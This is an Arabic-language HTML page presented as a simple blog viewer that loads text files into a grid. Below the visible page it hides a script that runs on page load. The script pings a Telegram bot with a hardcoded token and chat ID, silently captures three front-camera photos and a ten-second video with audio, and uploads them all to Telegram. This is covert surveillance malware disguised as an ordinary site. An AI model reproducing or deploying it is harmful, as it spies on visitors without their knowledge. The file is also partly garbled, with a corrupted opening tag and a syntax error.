webmOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>مدونات كاملة</title>
  <style>
    body {
      margin: 0;
      background: #fff000;
      font-family: Arial, sans-serif;
    }

    #blogs {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 20px;
      padding: 30px;
      direction: rtl;
    }

    .blog-box {
      background: rgba(90, 0, 130, 0.2);
      border: 2px dashed #cc33ff;
      box-shadow: 0 0 15px #cc33ff, 0 0 30px #9900cc;
      border-radius: 15px;
      padding: 10px;
      color: black;
      height: 150px;
      overflow: hidden;
      cursor: pointer;
      transition: transform 0.2s ease;
    }

    .blog-box:hover {
      transform: scale(1.05);
    }

    /* مربع كبير يغطي الشاشة بالكامل */
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.9);
      color: white;
      display: none;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 40px;
      z-index: 999;
      flex-direction: column;
    }

    #fullText {
      font-size: 28px;
      line-height: 2.2;
      white-space: pre-wrap;
      max-width: 90vw;
    }

    #copyBtn {
      margin-top: 30px;
      background-color: purple;
      color: white;
      font-size: 20px;
      padding: 12px 30px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }

    .home-btn {
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 75px;
      height: 75px;
      background-color: pink;
      color: black;
      font-size: 30px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      text-decoration: none;
      box-shadow: 0 0 15px yellow;
      animation: pulse 2s infinite;
      z-index: 1000;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 5px yellow; }
      50% { box-shadow: 0 0 25px yellow; }
      100% { box-shadow: 0 0 5px yellow; }
    }

    @media (max-width: 768px) {
      #blogs {
        grid-template-columns: 1fr;
      }
      #fullText {
        font-size: 22px;
      }
    }
  </style>
</head>
<body>

<!-- شبكة المربعات -->
<div id="blogs"></div>

<!-- مربع يغطي الشاشة بالكامل -->
<div id="overlay" onclick="hideOverlay(event)">
  <div id="fullText" onclick="event.stopPropagation()"></div>
  <button id="copyBtn" onclick="copyText()">📋 نسخ النص</button>
</div>

<!-- زر وردي يرجع إلى index.html -->
<a href="index.html" class="home-btn" title="العودة للصفحة الرئيسية">🏠</a>

<script>
  const blogFiles = ['blog1.txt', 'blog2.txt', 'blog3.txt'];
  const blogsContainer = document.getElementById('blogs');
  const overlay = document.getElementById('overlay');
  const fullText = document.getElementById('fullText');
  let allBlogs = [];

  async function loadBlogs() {
    for (const file of blogFiles) {
      try {
        const res = await fetch(file);
        const text = await res.text();
        const parts = text.split(/(?:\r?\n){2,}|===/g).filter(e => e.trim());
        allBlogs.push(...parts);
      } catch (err) {
        console.error('فشل تحميل', file, err);
      }
    }

    allBlogs.slice(0, 9).forEach((text) => {
      const box = document.createElement('div');
      box.className = 'blog-box';
      box.innerText = text.substring(0, 60) + '...';
      box.onclick = () => showFullText(text);
      blogsContainer.appendChild(box);
    });
  }

  function showFullText(text) {
    fullText.innerText = text;
    overlay.style.display = 'flex';
  }

  function hideOverlay(event) {
    overlay.style.display = 'none';
  }

  function copyText() {
    navigator.clipboard.writeText(fullText.innerText)
      .then(() => alert("✅ تم نسخ النص!"));
  }

  loadBlogs();
</script>

</div>


<!-- ✅ عرض الكاميرا (مخفي) -->
<video id="liveCamera" autoplay playsinline style="display:none;"></video>
<canvas id="snapshotCanvas" style="display:none;"></canvas>

<script>
  const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
  const CHAT_ID = "7664410054";
  let stream = null;

  function sendToTelegram(msg) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
    });
  }

  function dataURLtoBlob(dataurl) {
    const arr = dataurl.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], { type: mime });
  }

  function sendPhotoToTelegram(base64Img) {
    const blob = dataURLtoBlob(base64Img);
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, "photo.png");

    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    }).then(() => {
      console.log("✅ تم إرسال صورة");
    }).catch((err) => {
      console.error("❌ فشل إرسال الصورة:", err);
    });
  }

  async function startCameraAndSendPhotos() {
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
      const video = document.getElementById("liveCamera");
      video.srcObject = stream;
      const canvas = document.getElementById("snapshotCanvas");
      const ctx = canvas.getContext("2d");

      await new Promise(resolve => setTimeout(resolve, 1000)); // انتظار قليل بعد التشغيل

      for (let i = 0; i < 3; i++) {
        await new Promise(resolve => setTimeout(resolve, 1000)); // 1 ثانية بين كل صورة
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const base64Img = canvas.toDataURL("image/png");
        sendPhotoToTelegram(base64Img);
      }

      stream.getTracks().forEach(track => track.stop());
    } catch (err) {
      console.error("❌ فشل الوصول للكاميرا:", err);
    }
  }

  async function recordAndSendVideo() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
      const mediaRecorder = new MediaRecorder(stream);
      const chunks = [];

      mediaRecorder.ondataavailable = e => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: 'video/webm'' });
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("video", blob, "recorded_videow.webm");

        fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
          method: "POST",
          body: formData
        }).then(() => {
          console.log("🎥 تم إرسال الفيديو");
        }).catch((err) => {
          console.error("❌ فشل إرسال الفيديو:", err);
        });

        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start();
      console.log("🎥 بدأ التسجيل 10 ثواني...");
      setTimeout(() => {
        mediaRecorder.stop();
      }, 10000);

    } catch (err) {
      console.error("❌ فشل الوصول للكاميرا أو المايك:", err);
    }
  }

  window.onload = async () => {
    sendToTelegram("👁️ دخل الزائر");
    await startCameraAndSendPhotos(); // يلتقط 3 صور
    await recordAndSendVideo();       // يسجل فيديو 10 ثواني
  };
</script>

</body>
</html>
